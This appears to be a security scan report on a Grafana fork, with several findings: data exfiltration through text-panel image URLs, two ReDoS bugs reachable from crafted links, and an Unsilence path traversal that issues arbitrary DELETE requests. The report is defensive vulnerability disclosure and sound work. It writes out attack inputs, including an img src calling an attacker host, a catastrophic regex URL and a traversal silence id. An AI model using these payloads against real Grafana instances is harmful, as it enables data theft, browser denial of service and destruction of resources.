9. [public/app/plugins/panel/text/v1/TextPanel.tsx:73–99](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/text/v1/TextPanel.tsx#L73-L99)
   Zero-click exfiltration sink: processContent interpolates dashboard variables into the text panel content before markdown rendering, so `<img src="https://attacker/?v=${queryVar}">` carries the value of a query variable (fed by the victim's datasource) to the attacker's host; renderTextPanelMarkdown sanitizes with the xss whitelist, which keeps <img src>.

## Impact
The attacker's dashboard runs attacker-chosen variable and panel queries against the victim's default datasource with the victim's session and exfiltrates variable values zero-click via <img src> URLs interpolated in a text panel (TextPanel.tsx:78 interpolates before renderTextPanelMarkdown; the xss whitelist recovered from public/build/6540.*.js.map keeps the library's default img whitelist, assumed per xss 1.x to include src). For SQL-type default datasources that is arbitrary query results; for Prometheus/Loki it is label values and query_result output, so confidentiality is HIGH. With a denylisted HTML/JS panel plugin installed it is full script execution in the victim's origin. Integrity is limited to click-driven sinks (field actions, canvas buttons, data links) and the dirty edit-mode scene the victim might save as a new dashboard (uid '' and isNew:true force the create branch). Availability unaffected.

## Reproduction steps
1. Attacker: unauthenticated, needs only a free grafana.com account to publish a dashboard. Delivery: a single link to /dashboard/template?gnetId=<id>&mappings=[...]; the victim merely follows it (no prompt, no import step). Victim: any user holding dashboards:create (default Editor) on an instance where suggestedDashboards, dashboardLibrary or dashboardTemplates is enabled (route registration in routes.tsx:96-106); that non-default toggle is the attack requirement. The route performs no origin/consent check; the gnet JSON is fetched through the instance's own /api/gnet proxy (assumed, as in Grafana's Go source, to require only a signed-in session; the same call is used by the production import page DashboardImportK8s.tsx:64), interpolated with URL-controlled mappings and rendered live in edit mode. Assumes @grafana/scenes (pinned, not in checkout) activates panel and variable query runners on render, as the in-app template flow relies on.

## Recommended fix
1. The template route trusts any gnetId from the URL and renders the fetched grafana.com JSON live, while the safety filters (unsafe panel-type denylist, JS heuristic) are applied only in the UI handler that builds the URL, not where the content is consumed. Fix criteria: Apply the same (or stronger) safety validation at the point where the gnet JSON is turned into a scene — in loadCommunityTemplateDashboard/loadGrafanaDashboardTemplate or transformResponseToScene for the Template route — rejecting dashboards that fail it. Verify that a direct link with an arbitrary gnetId whose dashboard uses a denylisted panel type or JS-like options is refused, and that only server-side-curated sources (if any) bypass the check.
2. Live rendering happens on navigation with no user confirmation, and URL-supplied mappings bind the dashboard's datasource placeholders (including the wildcard 'default') to the victim's datasources. Fix criteria: Require an explicit in-app confirmation (showing the dashboard's grafana.com identity and the datasources it will query) before the fetched dashboard is activated when the route is entered from a link rather than from the in-app modal, or render the preview with queries disabled until confirmed. Verify that opening the template URL cold does not execute any datasource query or load any panel plugin before the user confirms.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Code injection
**CWE:** [CWE-829](https://cwe.mitre.org/data/definitions/829.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256412

---

# Cubic-backtracking regex on CloudWatch metric query alias runs on every query execution

## Details
The CloudWatch datasource's metric-query migration `migrateAliasPatterns` (public/app/plugins/datasource/cloudwatch/migrations/metricQueryMigrations.ts:30) rewrites legacy `{{...}}` alias patterns with `/{{\s*(.+?)\s*}}/g` applied to `query.alias` whenever the query object has no own `label` property. The pattern is ambiguous: after `{{`, a run of N whitespace characters (which match both `\s` and `.`) can be split between the greedy leading `\s*`, the lazy `.+?` and the greedy trailing `\s*` in O(N^2) ways, and every split is tried before the mandatory `}}` fails, so an alias of `{{` + N spaces with no closing braces costs about N^3/6 backtracking steps on the match attempt at offset 0 (a few thousand characters is already 10^9-10^10 steps; tens of thousands is effectively unbounded). Nothing in the plugin bounds alias length, and the regex literal ships verbatim in the webpack output (public/build/2531.*.js).

This is not a one-time dashboard migration. `CloudWatchMetricsQueryRunner.handleMetricQueries` (query-runner/CloudWatchMetricsQueryRunner.ts:60-61) calls `migrateMetricQuery` -> `migrateAliasPatterns` on every metrics target on every query execution, before any request leaves the browser; `MetricsQueryEditor` (components/QueryEditor/MetricsQueryEditor/MetricsQueryEditor.tsx:45) runs the same function via `useMigratedMetricsQuery` (migrations/useMigratedMetricsQuery.ts:14) in a `useMemo` on every render with a new query object. The only gate, `filterMetricsQuery` (utils/utils.ts:14-30), is satisfied by `region`, `metricQueryType: 0` (Search), `metricEditorMode: 1` (Code) and a non-empty `expression`, all set in the same query object; `filterQuery` (datasource.ts:93) only drops `hide: true`.

Traced Explore route (unauthenticated link author -> logged-in victim): the `panes` URL parameter is JSON-parsed by the v1 migrator, whose `applyDefaults` (features/explore/hooks/useStateSync/migrators/v1.ts:98-106) copies any `queries` array through untouched; `initializeFromURL` (hooks/useStateSync/synchronizer/init.ts:43-62) uses those query objects verbatim (only adding the pane datasource ref) and dispatches `initializeExplore` (state/explorePane.ts:167), which resolves the datasource by uid or name via `loadAndInitDatasource` and dispatches `runQueries` (explorePane.ts:217). `runQueries` (state/query.ts:602-638) passes `hasNonEmptyQuery` (any key beyond refId/key/context/datasource) and calls `runRequest` -> `CloudWatchDatasource.query` (datasource.ts:102-133) -> `handleMetricQueries`. Example pane query: `{"refId":"A","queryMode":"Metrics","region":"us-east-1","metricQueryType":0,"metricEditorMode":1,"expression":"x","alias":"{{<thousands of spaces>"}` with no `label` key. Explore also renders the query editor for the same object, so both paths execute the regex on the main thread and the tab hangs for a duration growing with the cube of the whitespace count. The attacker must name a CloudWatch datasource present in the victim's org (uid or name; the plugin's default name is "CloudWatch").

Stored variant (Editor -> Viewer): an Editor saves the same alias in a dashboard panel target; every Viewer who opens the dashboard hangs on load and on every refresh, with no length limit, until the panel JSON is repaired.

The backend is not involved: the regex executes before any request is made. Assumptions: V8's irregexp (Chromium, Firefox) and JavaScriptCore's YARR are backtracking matchers without memoisation for this pattern and the experimental linear-time fallback is not enabled by default; the practical cap on the URL variant is the request-line limit of the Go server or any fronting proxy (not verifiable here, backend absent), which still admits tens of thousands of characters; @grafana/runtime and @grafana/data behave as documented for the Explore load path.

## Evidence
1. [public/app/plugins/datasource/cloudwatch/migrations/metricQueryMigrations.ts:26–42](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/migrations/metricQueryMigrations.ts#L26-L42)
   migrateAliasPatterns() applies /{{\s*(.+?)\s*}}/g to query.alias whenever the query has no own `label` property. Spaces match both \s and `.`, so for `{{` + N spaces with no `}}` the leading \s*, lazy .+? and trailing \s* enumerate every split of the run before `}}` fails: ~N^3/6 backtracking steps. Alias length is never bounded. This is the code the fix must change.
2. [public/app/plugins/datasource/cloudwatch/query-runner/CloudWatchMetricsQueryRunner.ts:60–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/query-runner/CloudWatchMetricsQueryRunner.ts#L60-L61)
   handleMetricQueries() runs filterMetricQuery then migrateMetricQuery() (-> migrateAliasPatterns) on every metrics target on every query execution (Explore load, dashboard load, refresh), synchronously on the main thread before any request is sent.
3. [public/app/plugins/datasource/cloudwatch/migrations/useMigratedMetricsQuery.ts:14](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/migrations/useMigratedMetricsQuery.ts#L14)
   Second entry point: MetricsQueryEditor (components/QueryEditor/MetricsQueryEditor/MetricsQueryEditor.tsx:45) calls this hook, which runs migrateMetricQuery(query) in useMemo during render, so rendering the query editor in Explore or panel edit with the crafted query also executes the regex.
4. [public/app/plugins/datasource/cloudwatch/utils/utils.ts:14–29](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/utils/utils.ts#L14-L29)
   filterMetricsQuery() is the only gate before migration; it is satisfied by `region`, `metricQueryType: 0` (Search), `metricEditorMode: 1` (Code) and any non-empty `expression`, all of which the attacker sets in the same query object. It does not inspect alias.
5. [public/app/plugins/datasource/cloudwatch/datasource.ts:102–132](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/datasource.ts#L102-L132)
   query() clones the DataQueryRequest, drops only `hide: true` targets (filterQuery, line 93) and dispatches every target with queryMode 'Metrics' (or no queryMode) to metricsQueryRunner.handleMetricQueries; Explore URL pane queries and dashboard panel targets arrive here with their alias unchanged.
6. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:43–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L43-L61)
   initializeFromURL() takes the `queries` array parsed from the Explore `panes` URL parameter, applies only withUniqueRefIds and a datasource-compatibility filter, spreads each query object verbatim (adding only the datasource ref), and passes them to initializeExplore — no validation of query field contents or length.
7. [public/app/features/explore/hooks/useStateSync/migrators/v1.ts:98–106](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/migrators/v1.ts#L98-L106)
   applyDefaults() copies any `queries` array from the JSON-parsed `panes` URL parameter through untouched, so arbitrary query objects (including an unbounded `alias`) reach Explore state from a link.
8. [public/app/features/explore/state/explorePane.ts:213–218](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/state/explorePane.ts#L213-L218)
   initializeExplore() dispatches runQueries() as soon as the datasource instance resolves, so queries present in the URL are executed on page load without any user action; runQueries (state/query.ts:602-638) then calls runRequest -> CloudWatchDatasource.query.

## Impact
Impact is loss of availability of the victim's Grafana browser session: the tab's main thread blocks for seconds to effectively indefinitely depending on the whitespace count (cubic growth), until the user kills the tab. In the stored-dashboard variant the dashboard is unusable for all viewers on every load and refresh until an Editor repairs the JSON. No data is read or modified and the server is not involved.

## Reproduction steps
1. No Grafana account is needed: the attacker crafts an Explore link whose `panes` JSON names a CloudWatch datasource (uid or name, default name "CloudWatch") and carries a metrics query with an unbounded `alias` of `{{` followed by whitespace and no `label` key. When a logged-in victim opens the link, applyDefaults/initializeFromURL hand the query object through unchanged, initializeExplore dispatches runQueries, and CloudWatchDatasource.query -> handleMetricQueries -> migrateMetricQuery runs the cubic regex on the main thread; the rendered MetricsQueryEditor runs it again. No shipped control inspects or bounds the alias and no non-default configuration is required beyond a CloudWatch datasource existing. An Editor can persist the same alias in a dashboard target to hit every Viewer without any link. The only interaction is opening a link or dashboard (passive).

## Recommended fix
1. migrateAliasPatterns uses an ambiguous regex (`\s*(.+?)\s*` inside `{{ }}`) on an unbounded, attacker-controllable string, violating the property that query-model processing completes in time linear in input size. Fix criteria: Rewriting a legacy alias must take time linear in the alias length for any input (e.g. a pattern whose inner group cannot match whitespace consumed by the surrounding \s*, such as `{{\s*([^\s}][^}]*?)\s*}}`, or a hand-written scanner), and/or the alias must be length-capped before the regex runs. Verify that an alias of `{{` followed by 100,000 spaces and no closing braces is processed in milliseconds in both handleMetricQueries and useMigratedMetricsQuery.
2. The legacy-alias migration is executed on every query run and every editor render instead of once, so a hostile value is re-evaluated continuously. Fix criteria: Run the alias→label migration once (dashboard migration or on first load) and skip it when the query has already been migrated, so repeated query execution does not re-run string rewriting on stored values. Verify that a migrated query (own `label` present) performs no regex work in handleMetricQueries.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256305

---

# Alert rule list compiles URL-supplied label regex matchers, enabling ReDoS via crafted ?search= link

## Details
The alert rule list page (`/alerting/list`) builds its filter state from the `search` URL query parameter: `useRulesFilter` (hooks/useFilteredRules.ts:35-41) reads it from `useLocation().search` and `getSearchFilterFromQuery` pushes every `label:` token value verbatim into `filterState.labels` (search/rulesSearchParser.ts:98). The lezer grammar's `FilterValue` admits `( ) * + | ? [ ] { } ^ $ \ .` and `=~` (search/search.grammar:31-38), so a term such as `label:alertname=~(.*)*x` survives parsing intact. In the v2 list (`alertingListViewV2`, enabled by default per docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md) `filterPredicates.ts:labelsFilter` parses each term with `parseMatcher` (`=~`/`!~` sets `isRegex`) and calls `labelsMatchMatchers` for every rule, and additionally for every alert instance of every datasource alerting rule. `labelsMatchMatchers` (utils/alertmanager.ts:128) delegates to `matchLabelsSet` in `@grafana/alerting`, whose `=~`/`!~` operators (recovered from the shipped source map public/build/6253.d43f9787e85d163ff247.js.map, packages/grafana-alerting/src/grafana/matchers/utils.ts) execute `new RegExp('^(?:' + value + ')$', flags).test(labelValue)`. The pattern is attacker-controlled, the subject is the victim's rule/alert label values, and nothing bounds pattern length, structure or execution time; the surrounding try/catch only swallows syntax errors. The same sink is reached by the legacy v1 list via `useFilteredRules.ts:filterRules` (lines 289-304).

No user interaction beyond opening the link is needed: `useListViewMode` (RulesViewModeSelector.tsx:54-57) forces the list view whenever a filter other than group/namespace is active, `FilterView` renders `LoadMoreHelper`, whose intersection observer fires `loadResultPage` on mount, and `useFilteredRulesIteratorProvider` streams every group from Grafana (up to 2000 groups per API page when client-side filters are active, paginationLimits.ts:10,30-32) and from every configured Prometheus/Loki/Mimir rules source (`getRulesSourcesFromFilter` returns all external sources when no datasource filter is set), applying `ruleMatches` to each rule. Grafana-managed groups are fetched with `limitAlerts: 0` (useFilteredRulesIterator.ts:72), so for them only `rule.labels` is tested; datasource groups are fetched without `exclude_alerts`, so every alert instance's labels (alertname, instance, job, custom labels) are tested as well. For each label value that does not satisfy the pattern, the JavaScript backtracking engine performs work exponential in the label value length — for `(.*)*x` a 25-30 character value already costs 10^7-10^9 steps per test — repeated for every rule and instance. The victim's Grafana tab freezes on the main thread until the browser kills it.

Attacker: unauthenticated; they only need the victim (any authenticated user with alert-rule read access, i.e. Viewer by default) to open the link, e.g. embedded in a chat message, email, dashboard text panel or an alerting/list link in another Grafana page. No Grafana privilege, datasource control or state change is needed. For Grafana-managed rules the client-side labels predicate is only bypassed when the non-default, undocumented `alertingUIUseBackendFilters` toggle is on (grafanaFilter.ts:132); for datasource rules it is always client-side (datasourceFilter.ts:62). The scan's threat model lists ReDoS reachable from the URL as in scope.

Remediation belongs on the host side: validate/limit regex matchers taken from the URL before compiling them (length cap, reject nested quantifiers, or match with a linear-time engine as the backend's RE2 does), and/or require an explicit user action before URL-supplied regex filters are executed. The `fuzzySearch`-based name/namespace/group filters are not affected (they escape the needle).

## Evidence
1. [public/app/features/alerting/unified/rule-list/hooks/filterPredicates.ts:141–158](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/rule-list/hooks/filterPredicates.ts#L141-L158)
   labelsFilter takes every string in filterState.labels (populated verbatim from `label:` tokens in the ?search= query), parses it with looseParseMatcher (filterPredicates.ts:282-289 -> parseMatcher; operator `=~`/`!~` sets isRegex) into a Matcher, and calls labelsMatchMatchers(rule.labels, matchers) for every rule and additionally labelsMatchMatchers(alert.labels, matchers) for every alert instance of every datasource alerting rule. No length limit, no regex-safety check, no escaping.
2. [public/app/features/alerting/unified/utils/alertmanager.ts:128–132](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/alertmanager.ts#L128-L132)
   labelsMatchMatchers converts the matchers to @grafana/alerting LabelMatcher objects and hands them to matchLabelsSet. Recovered from public/build/6253.d43f9787e85d163ff247.js.map (packages/grafana-alerting/src/grafana/matchers/utils.ts): isLabelMatchInSet selects OperatorFunctions['=~'] / ['!~'] which do `new RegExp(parseFlags(`^(?:${mv})$`).cleaned, flags).test(lv)` where mv is the attacker's matcher value and lv is the rule/alert label value. The try/catch there only swallows invalid-pattern errors; it does not bound execution time.
3. [public/app/features/alerting/unified/hooks/useFilteredRules.ts:35–41](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/hooks/useFilteredRules.ts#L35-L41)
   useRulesFilter reads `search` straight from the URL query string (useURLSearchParams -> useLocation().search, no validation) and parses it with getSearchFilterFromQuery; rulesSearchParser.ts:98 pushes each `label:` token value unchanged into filterState.labels. This is the trust boundary: an unauthenticated attacker authors the link, the authenticated victim's browser executes the regex.
4. [public/app/features/alerting/unified/search/search.grammar:31–38](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/search/search.grammar#L31-L38)
   The lezer FilterValue token accepts allowedInputChar+ where allowedInputChar covers `!#$%&'()*+,-./`, digits and U+003B-U+1EFF (which includes `=~?[\]^{|}`), so regex metacharacters, nested quantifiers and the `=~` operator in a `label:` value reach filterState.labels unmodified; only `"` is stripped (searchParser.ts:84,90).
5. [public/app/features/alerting/unified/components/rules/Filter/RulesViewModeSelector.tsx:48–57](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rules/Filter/RulesViewModeSelector.tsx#L48-L57)
   useListViewMode forces viewMode='list' whenever an active filter other than groupName/namespace is present, so a ?search=label:... link alone (no ?view=list needed) renders FilterView and runs the client-side predicates. FilterView's LoadMoreHelper (rule-list/LoadMoreHelper.tsx:18-23) triggers loadResultPage from an intersection observer on mount, so no click is required.
6. [public/app/features/alerting/unified/rule-list/hooks/useFilteredRulesIterator.ts:70–121](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/rule-list/hooks/useFilteredRulesIterator.ts#L70-L121)
   FilterView's iterator applies frontendFilter.ruleMatches / ruleMatches to every rule of every fetched group from Grafana and from every Prometheus/Loki/Mimir rules source (getRulesSourcesFromFilter returns all external sources when no datasource filter is set; up to 2000 groups per API page per paginationLimits.ts:10,30-32). The Grafana generator is created with limitAlerts: 0 (line 72), so Grafana rules contribute only rule.labels; datasource groups are fetched without exclude_alerts (prometheusGroupsGenerator.ts:24-34), so their alert-instance labels (alertname, instance, job, ...) are matched as well.
7. [public/app/features/alerting/unified/rule-list/hooks/grafanaFilter.ts:125–137](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/rule-list/hooks/grafanaFilter.ts#L125-L137)
   For Grafana-managed rules the labels predicate is client-side (labelsFilter) unless the non-default alertingUIUseBackendFilters toggle is on (featureToggles.ts:27 defaults to false; the toggle is absent from the feature-toggle docs); for datasource rules (datasourceFilter.ts:62) it is always client-side.
8. [public/app/features/alerting/unified/hooks/useFilteredRules.ts:289–303](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/hooks/useFilteredRules.ts#L289-L303)
   The legacy v1 list (rule-list/RuleList.v1.tsx:52,121 -> useFilteredRules -> filterRules) reaches the same labelsMatchMatchers sink with the same URL-derived matchers, so the defect is present whichever list view is active.

## Impact
The victim's Grafana browser tab is blocked on the main thread by catastrophic regex backtracking for as long as the browser tolerates (seconds to indefinite for exponential patterns over 25+ character label values multiplied by the number of rules/instances); recovery requires killing the tab. No data is read or modified and the server is unaffected, so confidentiality/integrity are NONE and availability is rated LOW consistent with the scan's rating of comparable client-side hangs (template-parser-quadratic-regex-dos), though an exponential pattern makes the tab unrecoverable rather than merely slow.

## Reproduction steps
1. Attacker crafts `/alerting/list?search=label:alertname%3D~<catastrophic pattern>` and gets an authenticated Grafana user (Viewer or above) to open it (link in chat/email/dashboard). On load useRulesFilter parses the URL, useListViewMode forces the list view, FilterView streams all rules/alert instances from Grafana and every rules datasource, and labelsFilter compiles and executes the regex per rule and per alert instance. No privileges, no bypass of any mechanism, no special configuration: alertingListViewV2 is default-on and the v1 list has the same sink. Succeeds on any instance with alert rules carrying typical label values (alertname, instance, job are 15-40 chars).

## Recommended fix
1. filterPredicates.ts:labelsFilter (and useFilteredRules.ts:filterRules) forward URL-supplied `label:` matcher strings to labelsMatchMatchers, whose regex operators compile the attacker's value with new RegExp and run it against every rule/alert label value with no limit on pattern complexity or execution time, violating the property that untrusted URL input must not drive super-linear work in the victim's browser. Fix criteria: A `label:name=~<pattern>` term supplied through the URL must not be able to make the rule list page's filtering take super-linear time in label-value length: either reject or cap regex matchers from the URL (length limit and a nested-quantifier/complexity check before compilation), evaluate them with a linear-time matcher, or push label matching to the backend for all sources. Verify by loading `/alerting/list?search=label:alertname%3D~(.*)*x` against an instance with rules whose alertname is 30+ characters and confirming the page remains responsive and either filters correctly or reports the matcher as rejected.
2. The `=~`/`!~` operator implementations in @grafana/alerting matchers/utils.ts (consumed via utils/alertmanager.ts:labelsMatchMatchers) construct a RegExp from any caller-supplied string, so every caller that passes user input inherits the ReDoS. Fix criteria: The shared label-matcher regex path must bound or validate the pattern it compiles (or use a linear-time engine) so that no caller can introduce catastrophic backtracking by passing user-controlled matcher values; verify with a unit test asserting that a nested-quantifier pattern against a 40-character label value completes within milliseconds or is rejected.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256262

---

# External Alertmanager silence id traverses API path, turning Unsilence into arbitrary DELETE

## Details
The silences UI identifies a silence by the `id` string returned by the Alertmanager API and interpolates it, unencoded, into the request path `/api/alertmanager/{dsUid}/api/v2/silence/{id}` for both GET (view/edit) and DELETE ("Unsilence").

For the built-in Grafana Alertmanager the id is a server-generated UUID. For an *external* Alertmanager/Mimir/Cortex/Prometheus datasource (docs/sources/datasources/alertmanager: silences are read/write for all implementations), the list at `/api/alertmanager/{dsUid}/api/v2/silences` is proxied by the Go backend from the upstream, so a compromised or man-in-the-middled upstream (threat-model adversary 4) chooses every `id`. Assumption (backend not in checkout): the Go proxy for external Alertmanagers unmarshals the upstream silence list into the Alertmanager `gettableSilence` model, in which `id` is an unconstrained string, and re-serialises it without altering the id.

A silence whose id is e.g. `../../../../../dashboards/uid/<uid>` renders as a normal row in SilencesTable: the id is never displayed (columns are state, alert rule, matchers, alerts silenced, schedule, actions; SilenceDetails does not show it). For a non-expired row, a user holding `alert.instances.external:write` (granted to Editors and Admins via `fixed:alerting.instances:writer`) sees the "Unsilence" button (SilencesTable.tsx:400-408); clicking it calls `handleExpireSilenceClick(silence.id)` (SilencesTable.tsx:289-291), which issues `DELETE /api/alertmanager/{dsUid}/api/v2/silence/../../../../../dashboards/uid/<uid>` (alertSilencesApi.ts:93-96). The alerting RTK base query (alertingApi.ts:57-75) passes the request to backendSrv.fetch without `validatePath`; backend_srv.parseRequestOptions (backend_srv.ts:300-308) classifies it as local, adds X-Grafana-Org-Id and strips the leading slash; parseUrlFromOptions (fetch.ts:179-192) returns the string verbatim; `fromFetch(url, init)` hands it to the browser, whose URL parser resolves the five `..` segments against `<base href="[[.AppSubUrl]]/">` (public/views/index.html:15), producing `DELETE [appSubUrl]/api/dashboards/uid/<uid>` with `credentials: 'same-origin'` (grafana_session cookie). Because the request is same-origin, an Origin-based CSRF check does not block it, and the backend authorises it with the victim's RBAC.

Each crafted row yields one arbitrary DELETE under /api with the victim's authority. Shipped DELETE routes in public/api-merged.json include `/api/dashboards/uid/{uid}`, `/api/folders/{folder_uid}`, `/api/datasources/uid/{uid}`, `/api/library-elements/{uid}`, `/api/serviceaccounts/{id}`, `/api/teams/{id}`, `/api/org/users/{user_id}`, `/api/v1/provisioning/alert-rules/{UID}`, `/api/v1/provisioning/policies` (resets the notification policy tree) and, for server admins, `/api/admin/users/{user_id}` and `/api/orgs/{org_id}`. Multiple rows can be planted, each targeting a different resource, and the list is re-polled (SILENCES_POLL_INTERVAL_MS) so the upstream can rotate targets.

The GET path (`ExistingSilenceEditor`, SilencesEditor.tsx:57-68) has the same defect with the id taken from the SPA route (`/alerting/silence/:id/edit`), letting a crafted link make the browser GET an arbitrary API path and render the JSON as silence form fields; the response stays in the victim's browser, so that variant is limited to confusion.

Root cause: an upstream-supplied identifier is treated as a single path segment without being percent-encoded or validated, so `..` and `/` inside it change which resource the request addresses.

## Evidence
1. [public/app/features/alerting/unified/components/silences/SilencesTable.tsx:289–291](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/silences/SilencesTable.tsx#L289-L291)
   handleExpireSilenceClick passes silence.id, taken verbatim from the Alertmanager /api/v2/silences response, to the expireSilence mutation. The 'Unsilence' LinkButton at lines 400-408 invokes it on click for any non-expired row when the user holds the external-write permission; the id is never rendered in the table or in SilenceDetails, so a crafted id is invisible.
2. [public/app/features/alerting/unified/api/alertSilencesApi.ts:93–96](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/api/alertSilencesApi.ts#L93-L96)
   The DELETE URL is built by string interpolation `/api/alertmanager/${datasourceUid}/api/v2/silence/${silenceId}` with no encodeURIComponent and no check that silenceId is a single path segment. An id of `../../../../../dashboards/uid/X` rewrites the request target to /api/dashboards/uid/X once the browser normalises the path.
3. [public/app/features/alerting/unified/api/alertSilencesApi.ts:21–27](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/api/alertSilencesApi.ts#L21-L27)
   getSilences fetches the silence list from `/api/alertmanager/{dsUid}/api/v2/silences`, which the Go backend proxies to the configured external Alertmanager datasource; the `id` field of each Silence (a plain string in app/plugins/datasource/alertmanager/types.ts:256) is therefore controlled by whoever controls that upstream. No transformResponse validates it.
4. [public/app/features/alerting/unified/api/alertingApi.ts:57–75](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/api/alertingApi.ts#L57-L75)
   backendSrvBaseQuery spreads the endpoint's request options into getBackendSrv().fetch unchanged; it never sets validatePath, so the only client-side path check backend_srv offers is not applied to any alerting request.
5. [public/app/core/services/backend\_srv.ts:300–307](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L300-L307)
   parseRequestOptions treats the URL as local (isLocalUrl: not starting with http), adds X-Grafana-Org-Id, strips the leading '/' and otherwise leaves the path untouched; nothing rejects or encodes dot segments before the string reaches fromFetch (lines 274, 335).
6. [public/app/core/utils/fetch.ts:179–191](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L179-L191)
   parseUrlFromOptions returns options.url verbatim unless the request sets validatePath. The browser's URL parser then resolves the `..` segments of the relative URL against <base href="[[.AppSubUrl]]/"> (public/views/index.html:15), yielding a same-origin request to an arbitrary API path sent with credentials: 'same-origin'.
7. [public/app/features/alerting/unified/components/silences/SilencesEditor.tsx:57–67](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/silences/SilencesEditor.tsx#L57-L67)
   The same unencoded id template (alertSilencesApi.ts:49) is used for GET getSilence with the id taken from the SPA route param; a crafted link makes the victim's browser GET an arbitrary API path and render the JSON as a silence form. Lower impact (read-only, same-origin) but the same root cause.

## Impact
Each click performs one DELETE anywhere under /api with the victim's authority: dashboards, folders, datasources, library panels, service accounts, teams, org users, provisioned alert rules, the notification policy tree, and for server admins users and orgs. Integrity of arbitrary Grafana resources in the victim's org is therefore lost; deleted datasources and dashboards also degrade availability for other users. No data is returned to the attacker, so confidentiality is unaffected.

## Reproduction steps
